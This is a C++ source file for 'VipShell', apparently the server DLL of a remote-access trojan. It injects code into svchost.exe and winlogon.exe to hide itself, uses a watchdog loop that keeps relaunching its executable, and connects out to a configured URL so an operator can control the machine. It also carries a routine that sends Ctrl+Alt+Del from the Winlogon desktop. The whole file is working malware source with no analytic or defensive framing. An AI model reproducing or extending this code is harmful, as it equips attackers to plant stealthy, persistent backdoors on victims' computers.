#include <windows.h>
#include "tchar.h"
#include "VipShellEx.h"
#include "..\DllModule.h"
#include "tools.h"


#pragma data_seg(".VipShell__Data")
WCHAR g_Path[MAX_PATH] = {0};
#pragma data_seg()
#pragma comment(linker, "/SECTION:.VipShell__Data,RWS")

const LPCWSTR INJECTPROCESSNAME = L"svchost.exe";
const LPCWSTR WAITPROCESSNAME = L"winlogon.exe";  //等待线程
/*
const LPCWSTR INJECTPROCESSNAME = L"notepad.exe";
const LPCWSTR WAITPROCESSNAME = L"tlntsvr.exe";  //等待线程
*/
HINSTANCE g_hinstDLL;
WCHAR VIPSHELL_EVENT_WAIT[100] = L"VipShell_Event_Wait";
WCHAR VIPSHELL_EVENT_STATR_WAIT[100] = L"VipShell_Event_StartWait";
WCHAR VIPSHELL_EVENT_STATR_STOP[100] =  L"VipShell_Event_StopWait";

class CDllModuleControl : public  CDllModuleControlInterface
{
public:
	virtual bool StartServer() ;
};

CDllModuleControl g_hDllModule;



void StopServer()
{
	HANDLE hStop = CreateMutex(NULL,FALSE,VIPSHELL_EVENT_STATR_STOP);

}

bool  Start()
{

	//启动进程。。。

//	VIPSHELLCONFIG vipCfg;
//	GetVipShellConfig(&vipCfg);


	return 0;
}
int WINAPI WinMain(          HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
	return Start();
}	


void GetExeFilePath(WCHAR* p)
{
	lstrcpy(p, g_Path);
}

bool CDllModuleControl::StartServer()
{
	enableDebugPriv();
//	KeyDownCtrlAltDel();
	COpenDesktop hDesktop;
	COpenDesktop hDesktop1;
	//线程插入。。
	//得到 桌面进程
//	std::vector<tagVipShellProcess> VecTor;
//	DWORD dwLen = GetProcessToVecTor(&VecTor);

//	MessageBox(NULL, L"sss", L"sss", 0);
	CStartAggregate hStart;
	lstrcpy(g_Path, hStart.m_strExePath.c_str());
	VIPSHELLCONFIG confing;
	GetVipShellConfig(	&confing);

	wsprintf(VIPSHELL_EVENT_WAIT, L"Wait_%s", confing.szCfgFile);
	wsprintf(VIPSHELL_EVENT_STATR_WAIT, L"Start_Wait_%s", confing.szCfgFile);
	wsprintf(VIPSHELL_EVENT_STATR_STOP, L"StopWait_%s", confing.szCfgFile);




	HANDLE hObject = CreateMutex(NULL,FALSE,VIPSHELL_EVENT_WAIT);
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
//		CloseHandle(hObject);
	//	MessageBox(NULL, L"程序已经运行!", L"dsss", 0);
		return FALSE;
	}
//	CloseHandle(hObject);
	



	



//	lstrcpy(confing.szCfgFile, L"sss111");
//	lstrcpy(confing.szExplain, L"呵呵");
//	lstrcpy(confing.szUrl, L"Url");

//	MakeRun(hStart.m_strExePath.c_str(), NULL);
//	::StartServer(&confing);
//	return false;

	DWORD dwWaitId = 0;
	while(dwWaitId == 0)
		dwWaitId = GetProcessIdByName(WAITPROCESSNAME);
	
	std::vector<tagVipShellProcess> VecTor;
	DWORD dwLen = GetProcessToVecTor(&VecTor);

	HWND hwndText = FindWindow(L"Notepad", NULL);
//	if( !hwndText )
//		return 0;
	DWORD dwProcessId;
//	GetWindowThreadProcessId(hwndText, &dwProcessId);
	dwProcessId = GetProcessIdByName(INJECTPROCESSNAME);
	
	InjectHideMe(dwProcessId, &confing,"StartServer");

	
	if(dwWaitId != 0)
	{
			VIPSHELLCONFIG run;
			
			lstrcpy(run.szUrl, hStart.m_strExePath.c_str());
			InjectHideMe(dwWaitId, &run,"WaitServer");
	}

//	Start();
	return 0;
}
extern "C" __declspec(dllexport) bool DownCtrlAltDel(LPVOID lp)
{
	COpenDesktop hDesktop(L"Winlogon");
	COpenDesktop hDesktop1(L"Winlogon");
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	return true;
}
void KeyDownCtrlAltDel()
{
	enableDebugPriv();
	DWORD dwWaitId = GetProcessIdByName(WAITPROCESSNAME);
	if(dwWaitId != 0)
	{
		VIPSHELLCONFIG run;
		InjectHideMe(dwWaitId, &run,"DownCtrlAltDel");
	}
}

extern "C" __declspec(dllexport) bool WaitServer(LPVOID lp)
{
	COpenDesktop hDesktop;
	COpenDesktop hDesktop1;
	 
	LPVIPSHELLCONFIG hServerConfig = (LPVIPSHELLCONFIG)lp;
	
	MakeRun(hServerConfig->szUrl, NULL);
	return false;

	HANDLE hObject = CreateMutex(NULL,FALSE, VIPSHELL_EVENT_STATR_WAIT);
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
	//	CloseHandle(hObject);
		return 0;
	}
	MakeRun(hServerConfig->szUrl, NULL);
//	
	DWORD dwWait = 1000;
	while(1)
	{

		HANDLE hStop = CreateMutex(NULL,FALSE,VIPSHELL_EVENT_STATR_STOP);
		if(GetLastError() == ERROR_ALREADY_EXISTS)
		{		
			MessageBox(NULL, L"Exit", L"Exit", 0);
			MakeRun(hServerConfig->szUrl, NULL, false);
			CloseHandle(hStop);
		}
		CloseHandle(hStop);
		Sleep(dwWait);
		dwWait+=1000;
		if(dwWait > 30 * 60 * 1000)
			dwWait = 30 * 60 * 1000;
		HANDLE hObject = CreateMutex(NULL,FALSE,VIPSHELL_EVENT_WAIT);
		if(GetLastError() == ERROR_ALREADY_EXISTS)
		{		
		//	CloseHandle(hObject);
			continue;
	//		MessageBox(NULL, L"程序已经运行!", L"dsss", 0);
//			return FALSE;
		}

		CloseHandle(hObject);

		
		PROCESS_INFORMATION ProcessInfo; 
		STARTUPINFO StartupInfo; //This is an [in] parameter
		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
		StartupInfo.cb = sizeof StartupInfo ; //Only compulsory field
		if(CreateProcess(hServerConfig->szUrl, NULL, 
			NULL,NULL,FALSE,0,NULL,
			NULL,&StartupInfo,&ProcessInfo))
		{ 
			CloseHandle(ProcessInfo.hThread);
			CloseHandle(ProcessInfo.hProcess);
		}  

		RunFile(hServerConfig->szUrl);
//ShellExecute(NULL, L"open", hServerConfig->szUrl, NULL, NULL, SW_SHOW);

	}

	return 0;
}
extern "C" __declspec(dllexport) bool StartServer(LPVOID lp)
{
	
	enableDebugPriv();
	COpenDesktop hDesktop;
	COpenDesktop hDesktop1;
	HANDLE hMutex = CreateMutex(NULL, FALSE, VIPSHELL_EVENT_WAIT);
	LPVIPSHELLCONFIG hServerConfig = (LPVIPSHELLCONFIG)lp;
	

//	MessageBox(NULL, g_Path, g_Path, NULL);
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
//	MessageBox(NULL, hServerConfig->szExplain, hServerConfig->szCfgFile, 0);
	wVersionRequested = MAKEWORD( 2, 2 );
	 
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		/* Tell the user t6hat we could not find a usable */
		/* WinSock DLL.                                  */
		return 0;
	}
	CVipShellEx hServer;
	hServer.SetExplain(hServerConfig->szExplain);
	//下载配置文件。。
//	hServer.ConnectServer(_T("127.0.0.1"), 96);
//	hServer.ConnectServer(L"http://127.0.0.1:81/ip.txt");
	hServer.ConnectServer(hServerConfig->szUrl);
	while(1)
	{
		Sleep(1000);
	}
	WSACleanup();
}

extern "C" __declspec(dllexport) bool GetDllModuleControl(CDllModuleControlInterface** p)   
{
	*p = (CDllModuleControlInterface*)&g_hDllModule;
	return true;
}

DWORD WINAPI HideMe(LPVOID lpParameter)
{
	typedef BOOL (*PVipShellStartServer)(LPVOID lp);
	PThreadParam	a = (PThreadParam)lpParameter;
	HINSTANCE	hDll = NULL;
	PVipShellStartServer	pfnVipShellStartServer = NULL;
	BOOL		bFlag = FALSE;
    
	hDll = a->pfnLoadLibraryA(a->szDllName);
	if( !hDll ) return FALSE;
    
	pfnVipShellStartServer = (PVipShellStartServer)a->pfnGetProcAddress(hDll, a->szFunctionName);
	if( !pfnVipShellStartServer) return FALSE;
    
	bFlag = pfnVipShellStartServer(&a->lp);
	//a->pfnFreeLibrary(hDll);
	return 	bFlag;
}



void InjectHideMe(DWORD dwProcessId, LPVIPSHELLCONFIG lp, LPCSTR szFnName)
{
    ThreadParam		tp;
    HINSTANCE		hKernel32 = NULL;
    DWORD		dwPid;
    DWORD		dwFuncSize = 2048;

 
	dwPid = dwProcessId;
    hKernel32 = GetModuleHandle( L"kernel32.dll" );
    tp.pfnGetProcAddress = (PGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    tp.pfnLoadLibraryA	= (PLoadLibraryA)GetProcAddress(hKernel32, "LoadLibraryA");
    tp.pfnFreeLibrary	= (PFreeLibrary)GetProcAddress(hKernel32, "FreeLibrary");
    strcpy(tp.szFunctionName, szFnName);
    GetModuleFileNameA((HINSTANCE)g_hinstDLL, tp.szDllName, MAX_PATH);
	memcpy(&tp.lp, lp, sizeof(VIPSHELLCONFIG));
    Inject( dwPid, HideMe, dwFuncSize, &tp, sizeof(tp), 1000);
}



BOOL WINAPI DllMain(
  HINSTANCE hinstDLL,
  DWORD fdwReason,
  LPVOID lpvReserved
)
{
	g_hinstDLL = hinstDLL;
	return TRUE;
}